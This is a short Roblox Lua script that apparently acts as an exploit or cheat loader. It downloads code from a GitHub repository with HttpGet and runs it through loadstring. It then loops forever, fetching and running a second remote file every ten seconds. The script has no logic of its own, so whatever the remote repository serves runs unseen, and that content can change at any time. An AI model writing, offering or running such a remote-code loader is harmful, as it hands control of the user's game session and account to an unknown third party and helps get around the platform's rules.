loadstring(game:HttpGet("https://raw.githubusercontent.com/lakysq/EasyAntyRpgg/refs/heads/main/LOGI", true ))()
local function backgroundLoop()
    while true do
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lakysq/EasyAntyRpgg/refs/heads/main/GUARD2", true ))()
        task.wait(10)
    end
end
spawn(backgroundLoop)
